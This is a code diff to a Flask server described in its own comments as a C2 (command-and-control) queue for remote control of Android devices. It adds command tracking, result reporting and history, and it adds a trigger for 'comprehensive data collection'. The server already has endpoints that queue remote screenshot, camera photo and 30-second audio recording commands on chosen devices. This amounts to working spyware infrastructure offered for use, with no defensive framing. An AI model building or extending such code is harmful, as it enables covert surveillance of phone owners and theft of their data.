@@ -38,6 +38,7 @@ import re
 import json
 import time
 import shutil
+import uuid
 from datetime import datetime
 
 app = Flask(__name__)
@@ -126,17 +127,41 @@ migrate_legacy_data()
 device_checkins = {}  # android_id -> dict with last_seen_epoch, model, brand, etc.
 ONLINE_THRESHOLD_SECONDS = 60
 
-# In-memory C2 command queue for remote control
+# In-memory C2 command queue and history for remote control
 pending_commands = []
+command_history = []
+
+
+def queue_command(action, target='all', params=None):
+    """Queue a new command with a unique ID and record in history."""
+    cmd_id = f"cmd_{int(time.time()*1000)}_{uuid.uuid4().hex[:6]}"
+    cmd = {
+        'id': cmd_id,
+        'command_id': cmd_id,
+        'action': action,
+        'target': target,
+        'params': params or {},
+        'status': 'queued',
+        'created_at': datetime.now().isoformat()
+    }
+    pending_commands.append(cmd)
+    command_history.insert(0, cmd)
+    if len(command_history) > 100:
+        command_history.pop()
+    return cmd
 
 
 def pop_pending_commands(aid=None):
     global pending_commands
     matched = []
     remaining = []
+    now_iso = datetime.now().isoformat()
     for cmd in pending_commands:
         target = cmd.get('target', 'all')
         if target == 'all' or not aid or target == aid:
+            cmd['status'] = 'dispatched'
+            cmd['dispatched_at'] = now_iso
+            cmd['dispatched_to'] = aid or 'unknown'
             matched.append(cmd)
         else:
             remaining.append(cmd)
@@ -301,10 +326,76 @@ def api_commands():
     return jsonify(pending_commands)
 
 
+@app.route('/api/commands/history', methods=['GET'])
+def api_commands_history():
+    """Return the full C2 command history with status tracking."""
+    return jsonify(command_history)
+
+
+@app.route('/api/commands/clear', methods=['POST'])
+def api_clear_commands():
+    """Clear all pending C2 commands."""
+    global pending_commands
+    count = len(pending_commands)
+    pending_commands = []
+    for c in command_history:
+        if c.get('status') == 'queued':
+            c['status'] = 'cancelled'
+    log_event('action', f"Cleared {count} pending commands from queue")
+    return jsonify({'status': 'success', 'cleared_count': count})
+
+
+@app.route('/api/commands/result', methods=['POST'])
+def receive_command_result():
+    """Receive command execution acknowledgment and result from device."""
+    data = request.get_json(silent=True) or {}
+    cmd_id = data.get('command_id')
+    aid = data.get('android_id') or 'unknown'
+    status = data.get('status', 'completed')
+    action = data.get('action', '')
+    res = data.get('result', {})
+    err = data.get('error')
+    now_iso = datetime.now().isoformat()
+
+    found = False
+    for c in command_history:
+        if c.get('id') == cmd_id or c.get('command_id') == cmd_id:
+            c['status'] = status
+            c['completed_at'] = now_iso
+            c['result'] = res
+            c['error'] = err
+            found = True
+            break
+    if not found and cmd_id:
+        command_history.insert(0, {
+            'id': cmd_id,
+            'command_id': cmd_id,
+            'action': action,
+            'target': aid,
+            'status': status,
+            'completed_at': now_iso,
+            'result': res,
+            'error': err
+        })
+
+    log_event('action', f"Command {action} ({cmd_id}) {status.upper()}", {
+        'command_id': cmd_id,
+        'android_id': aid,
+        'status': status,
+        'action': action,
+        'result': res,
+        'error': err,
+        'timestamp': now_iso
+    })
+
+    return jsonify({'status': 'success', 'command_id': cmd_id, 'recorded_status': status})
+
+
 @app.route('/api/heartbeat', methods=['POST', 'GET'])
 def receive_heartbeat():
     """Receive heartbeat ping from active device over the network."""
     data = request.get_json(silent=True) or {}
+    poll_commands = request.args.get('poll_commands') != '0'
     aid = data.get('android_id') or request.args.get('android_id') or request.headers.get('X-Android-ID')
     if aid:
         device_checkins[aid] = {
@@ -316,7 +407,7 @@ def receive_heartbeat():
             'release': data.get('release'),
             'sdk_version': data.get('sdk_version')
         }
-        cmds = pop_pending_commands(aid)
+        cmds = pop_pending_commands(aid) if poll_commands else []
         return jsonify({
             'status': 'success',
             'device_status': 'online',
@@ -324,7 +415,7 @@ def receive_heartbeat():
             'commands': cmds,
             'timestamp': datetime.now().isoformat()
         })
-    cmds = pop_pending_commands(None)
+    cmds = pop_pending_commands(None) if poll_commands else []
     return jsonify({'status': 'success', 'commands': cmds, 'message': 'missing android_id'})
 
 
@@ -566,17 +657,18 @@ def api_trigger_screenshot():
     """Manually trigger a screenshot/photo capture command from the Android app."""
     data = request.get_json(silent=True) or {}
     target = data.get('target') or request.args.get('target') or 'all'
-    cmd = {'action': 'take_screenshot', 'target': target, 'timestamp': datetime.now().isoformat()}
-    pending_commands.append(cmd)
-    log_event('action', 'Screenshot capture command queued for client', {
+    cmd = queue_command('take_screenshot', target=target)
+    log_event('action', f"Screenshot command queued ({cmd['id']}) for client", {
         'timestamp': datetime.now().isoformat(),
         'action_type': 'manual_screenshot',
+        'command_id': cmd['id'],
         'status': 'queued',
         'target': target
     })
 
     return jsonify({
         'status': 'success',
+        'command_id': cmd['id'],
         'message': 'Screenshot capture command queued',
         'timestamp': datetime.now().isoformat()
     })
@@ -588,17 +680,18 @@ def api_trigger_photo():
     """Manually trigger a camera photo capture command from the Android app."""
     data = request.get_json(silent=True) or {}
     target = data.get('target') or request.args.get('target') or 'all'
-    cmd = {'action': 'take_photo', 'target': target, 'timestamp': datetime.now().isoformat()}
-    pending_commands.append(cmd)
-    log_event('action', 'Camera photo capture command queued for client', {
+    cmd = queue_command('take_photo', target=target)
+    log_event('action', f"Camera photo capture command queued ({cmd['id']}) for client", {
         'timestamp': datetime.now().isoformat(),
         'action_type': 'manual_photo',
+        'command_id': cmd['id'],
         'status': 'queued',
         'target': target
     })
 
     return jsonify({
         'status': 'success',
+        'command_id': cmd['id'],
         'message': 'Camera photo capture command queued',
         'timestamp': datetime.now().isoformat()
     })
@@ -609,11 +702,11 @@ def api_trigger_audio():
     """Manually trigger audio recording command from the Android app."""
     data = request.get_json(silent=True) or {}
     target = data.get('target') or request.args.get('target') or 'all'
-    cmd = {'action': 'record_audio', 'duration': 30000, 'target': target, 'timestamp': datetime.now().isoformat()}
-    pending_commands.append(cmd)
-    log_event('action', 'Audio recording command queued for client', {
+    cmd = queue_command('record_audio', target=target, params={'duration': 30000})
+    log_event('action', f"Audio recording command queued ({cmd['id']}) for client", {
         'timestamp': datetime.now().isoformat(),
         'action_type': 'manual_audio',
+        'command_id': cmd['id'],
         'status': 'queued',
         'duration': '30 seconds',
         'target': target
@@ -621,7 +714,31 @@ def api_trigger_audio():
 
     return jsonify({
         'status': 'success',
+        'command_id': cmd['id'],
         'message': 'Audio recording command queued (30 seconds)',
+        'timestamp': datetime.now().isoformat()
+    })
+
+
+@app.route('/api/trigger/collect', methods=['POST'])
+@app.route('/api/trigger/data', methods=['POST'])
+def api_trigger_collect():
+    """Manually trigger on-demand comprehensive data collection from device."""
+    data = request.get_json(silent=True) or {}
+    target = data.get('target') or request.args.get('target') or 'all'
+    cmd = queue_command('collect_data', target=target)
+    log_event('action', f"On-demand data collection command queued ({cmd['id']}) for client", {
+        'timestamp': datetime.now().isoformat(),
+        'action_type': 'collect_data',
+        'command_id': cmd['id'],
+        'status': 'queued',
+        'target': target
+    })
+
+    return jsonify({
+        'status': 'success',
+        'command_id': cmd['id'],
+        'message': 'Data collection command queued',
         'timestamp': datetime.now().isoformat()
     })
 
